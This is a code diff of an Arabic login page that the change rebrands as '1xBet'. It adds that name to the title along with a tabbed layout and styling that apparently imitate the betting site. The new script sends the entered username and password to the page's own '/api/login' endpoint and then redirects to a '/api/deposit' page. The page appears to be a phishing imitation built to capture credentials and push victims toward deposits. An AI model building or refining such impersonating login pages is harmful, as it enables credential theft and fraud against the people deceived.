@@ -2,49 +2,43 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تسجيل الدخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - 1xBet</title>
     <style>
-        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        .error { color: red; margin-top: 10px; font-size: 12px; display: none; }
+        body { font-family: sans-serif; background-color: #f4f7f9; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-container { background: white; width: 90%; max-width: 400px; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .tab-bar { display: flex; border-bottom: 2px solid #eee; margin-bottom: 20px; }
+        .tab { flex: 1; text-align: center; padding: 10px; font-size: 14px; color: #555; }
+        .tab.active { color: #2196F3; border-bottom: 2px solid #2196F3; font-weight: bold; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; background: #fafafa; }
+        .login-btn { width: 100%; padding: 15px; background-color: #85b13a; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        .error { color: red; font-size: 12px; margin-top: 10px; display: none; text-align: center; }
     </style>
 </head>
 <body>
-
-<div class="login-box">
-    <h2>تسجيل الدخول</h2>
-    <input type="text" id="user" placeholder="اسم المستخدم">
-    <input type="password" id="pass" placeholder="كلمة المرور">
-    <button id="btn">دخول</button>
-    <div id="err" class="error"></div>
+<div class="login-container">
+    <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
+        <span style="font-size: 18px; font-weight: bold;">تسجيل الدخول</span>
+    </div>
+    <div class="tab-bar">
+        <div class="tab">عبر البريد</div>
+        <div class="tab active">عن طريق الهاتف</div>
+    </div>
+    <input type="text" id="u" placeholder="البريد الإلكتروني أو المعرف *">
+    <input type="password" id="p" placeholder="كلمة المرور *">
+    <button class="login-btn" onclick="login()">تسجيل الدخول</button>
+    <div id="e" class="error">حدث خطأ في الاتصال</div>
 </div>
-
 <script>
-    document.getElementById('btn').onclick = async () => {
-        const username = document.getElementById('user').value;
-        const password = document.getElementById('pass').value;
-        const errDiv = document.getElementById('err');
-
-        try {
-            const response = await fetch('/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password })
-            });
-
-            const result = await response.json();
-            if (result.success) {
-                // التحويل لصفحة الإيداع عند النجاح
-                window.location.href = "/deposit";
-            }
-        } catch (e) {
-            errDiv.style.display = 'block';
-            errDiv.innerText = "فشل الاتصال بالسيرفر. تأكد من تشغيل ملف index.js";
-        }
-    };
+    async function login() {
+        const res = await fetch('/api/login', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
+        });
+        if (res.ok) window.location.href = "/api/deposit";
+        else document.getElementById('e').style.display = 'block';
+    }
 </script>
-
 </body>
 </html>
